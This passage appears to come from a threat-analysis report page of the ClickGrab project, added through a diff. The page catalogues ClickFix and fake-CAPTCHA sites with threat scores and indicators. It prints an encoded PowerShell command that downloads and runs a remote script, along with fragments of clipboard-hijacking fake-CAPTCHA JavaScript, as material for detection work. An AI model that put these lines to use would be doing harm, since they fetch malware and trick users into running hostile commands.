+                                <div><strong>Status:</strong> ok</div>
+                                
+                                <div class="code-block"><pre>&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don&#39;t have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at svetvip.ru Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</pre></div>
+                                
+                            </div>
+                            
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="http://82.146.62.232/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">http://82.146.62.232/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            47 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 307</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                        <span class="attack-type-badge">Redirect Chain</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-7')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-7')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-7')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-7" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">redirects</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">redirect follows</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-7" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">4</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">exec(ua) != nuii){rv = parseFioat(RegExp.$i);}}eise if (n.appName == &#34;Netscape&#34;){rv = ii;re = new RegExp(&#34;Trident/.*rv:([0-9]+[\.0-9]*)&#34;);if (re.exec(ua) != nuii){rv = parseFioat(RegExp.$i);}}}return rv;}})(window, document, navigator)</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">exec(</div>
+                            
+                            <div class="indicator-item">hidden</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">15</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://svetvip.ru/</div>
+                            
+                            <div class="indicator-item">https://api.whatsapp.com/send?phone=79258627909</div>
+                            
+                            <div class="indicator-item">https://api.whatsapp.com/send?phone=79258627909</div>
+                            
+                            <div class="indicator-item">https://svetvip.ru/catalog/vstraivaemye_svetilniki/</div>
+                            
+                            <div class="indicator-item">https://svetvip.ru/catalog/trekovye_i_shinnye_svetilniki/</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-7" class="tab-content">
+                    
+                    
+                    
+
+                    
+
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">🛰️ Redirect Follower Findings (1)</h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">
+                                <div><strong>Source:</strong> inline_js</div>
+                                <div><strong>Method:</strong> script_src</div>
+                                <div><strong>Original:</strong> <a href="http://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjEwMwEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAEzN2IyMzE3MTllOTk3OTJhY2RlMTQwOTg3NjUzNjgxYQExNzk1NjYyMTAzAS8BAQEC&amp;k=f0025cc370daa30adca2d17e523f7a92" target="_blank">http://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjEwMwEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAEzN2IyMzE3MTllOTk3OTJhY2RlMTQwOTg3NjUzNjgxYQExNzk1NjYyMTAzAS8BAQEC&amp;k=f0025cc370daa30adca2d17e523f7a92</a></div>
+                                
+                                <div><strong>Final:</strong> <a href="http://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjEwMwEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAEzN2IyMzE3MTllOTk3OTJhY2RlMTQwOTg3NjUzNjgxYQExNzk1NjYyMTAzAS8BAQEC&amp;k=f0025cc370daa30adca2d17e523f7a92" target="_blank">http://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjEwMwEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAEzN2IyMzE3MTllOTk3OTJhY2RlMTQwOTg3NjUzNjgxYQExNzk1NjYyMTAzAS8BAQEC&amp;k=f0025cc370daa30adca2d17e523f7a92</a></div>
+                                
+                                
+                                <div class="code-block"><pre>new Image().src=&#39;http://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjEwMwEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAEzN2IyMzE3MTllOTk3OTJhY2RlMTQwOTg3NjUzNjgxYQExNzk1NjYyMTAzAS8BAQEC&amp;k=f0025cc370daa30adca2d17e523f7a92&#39;;</pre></div>
+                                <div><strong>Status:</strong> ok</div>
+                                
+                                <div class="code-block"><pre>&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don&#39;t have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at svetvip.ru Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</pre></div>
+                                
+                            </div>
+                            
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://kjarz.com/uri.html">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://kjarz.com/uri.html</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            14 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 195</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Obfuscated JS</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-8')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-8')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-8')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-8" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">obfuscation</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-8" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">documentElement.innerHTML</div>
+                            
+                            <div class="indicator-item">powershell -wind mi -Enc JAByAD0AJwBkAG8AdwAgAHkAbwB1AHIAZgBpACcAOwAuACcAaQBlAHgAJwAoACYAKAAkAHIAWwA5AF0AKwAkAHIAWwAyAF0AKwAkAHIAWwA3AF0AKQAgAGgAdAB0AHAAcwA6AC8ALwBrAGoAYQByAHoALgBjAG8AbQAvAGoALgB0AHgAdAApAC4AQwBvAG4AdABlAG4AdAA=&#34;);</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-8" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">🔐 Obfuscated JavaScript</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 1 of 1 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>{&#39;script&#39;: &#39;\r\nif (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(navigator.userAgent)) {\r\nwindow.stop();\r\ndocument.documentEl...&#39;, &#39;indicators&#39;: [{&#39;pattern&#39;: &#39;var\\s+_0x[a-f0-9]{4,6}\\s*=&#39;, &#39;examples&#39;: [&#39;var _0x4F27=&#39;, &#39;var _0x18FF=&#39;], &#39;count&#39;: 3}, {&#39;pattern&#39;: &#39;_0x[a-f0-9]{4,6}\\[.*?\\]&#39;, &#39;examples&#39;: [&#39;_0x4F27[_idx]&#39;], &#39;count&#39;: 1}, {&#39;pattern&#39;: &#39;var\\s+_0x[a-f0-9]{2,8}\\s*=&#39;, &#39;examples&#39;: [&#39;var _0x4F27=&#39;, &#39;var _0x18FF=&#39;], &#39;count&#39;: 3}], &#39;score&#39;: 7, &#39;position&#39;: 100}</pre>
+                        </div>
+                        
+                    </div>
+                    
+
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="http://101.32.40.22/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">http://101.32.40.22/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            27 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 169</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-9')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-9')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-9')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-9" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">5</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">10</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-9" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">10</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">Verification</div>
+                            
+                            <div class="indicator-item">verification-id</div>
+                            
+                            <div class="indicator-item">verification_id</div>
+                            
+                            <div class="indicator-item">hidden</div>
+                            
+                            <div class="indicator-item">mshta</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">4</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/privacy/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/terms/</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-9" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 4 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextA...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ck&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = &#34;0&#34;; checkboxBtnSpinner.style.animation = &#34;none&#34;; setTimeout(function() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = &#34;hidden&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaCheckbox() { checkboxBtn.style.width = &#34;100%&#34;; checkboxBtn.style.height = &#34;100%&#34;; checkboxBtn.style.borderRadius = &#34;2px&#34;; checkboxBtn.style.margin = &#34;21px 0 0 12px&#34;; checkboxBtn.style.opacity = &#34;1&#34;; } function hideCaptchaCheckbox() { checkboxBtn.style.width = &#34;4px&#34;; checkboxBtn.style.height = &#34;4px&#34;; checkboxBtn.style.borderRadius = &#34;50%&#34;; checkboxBtn.style.marginLeft = &#34;25px&#34;; checkboxBtn.style.marginTop = &#34;33px&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; checkboxBtnSpinner.style.opacity = &#34;0&#34;; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = &#34;none&#34;; verifywindow.style.visibility = &#34;hidden&#34;; verifywindow.style.opacity = &#34;0&#34;; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== &#34;none&#34; &amp;&amp; verifywindow.style.display !== &#34;&#34;; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&#34;textarea&#34;); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = &#34; # &#34; const ploy = &#34;â &#39;&#39;I am not a robot - reCAPTCHA Verification ID: &#34; const end = &#34;&#39;&#39;&#34; const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    
+</section>
+
+<!-- Technical Analysis Section -->
+
+
+<script>
+function toggleSite(header) {
+    const card = header.closest('.site-card');
+    card.classList.toggle('expanded');
+}
+
+function showTab(button, tabId) {
+    const tabs = button.parentElement.querySelectorAll('.detail-tab');
+    tabs.forEach(tab => tab.classList.remove('active'));
+    button.classList.add('active');
+    
+    const card = button.closest('.site-details');
+    const contents = card.querySelectorAll('.tab-content');
+    contents.forEach(content => content.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+}
+
+function expandAll() {
+    document.querySelectorAll('.site-card').forEach(card => {
+        card.classList.add('expanded');
+    });
+}
+
+function collapseAll() {
+    document.querySelectorAll('.site-card').forEach(card => {
+        card.classList.remove('expanded');
+    });
+}
+
+function copyCode(button) {
+    const code = button.nextElementSibling.textContent;
+    navigator.clipboard.writeText(code);
+    button.textContent = '✅ Copied!';
+    setTimeout(() => button.textContent = 'Copy', 2000);
+}
+</script>
+
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="text-logo">CLICKGRAB</span>
+                    <p>Analyzing ClickFix and FakeCAPTCHA URLs from URLhaus</p>
+                </div>
+                <div class="footer-links">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="/ClickGrab/analysis.html">Analysis</a></li>
+                        <li><a href="/ClickGrab/reports.html">Reports</a></li>
+                        <li><a href="/ClickGrab/techniques.html">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html">Mitigations</a></li>
+                        <li><a href="https://urlhaus.abuse.ch/" target="_blank">URLhaus</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h3>Connect</h3>
+                    <ul>
+                        <li><a href="https://github.com/MHaggis/clickgrab" target="_blank">GitHub</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 ClickGrab Project. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/ClickGrab/assets/js/main.js"></script>
+    
+</body>
+</html> 
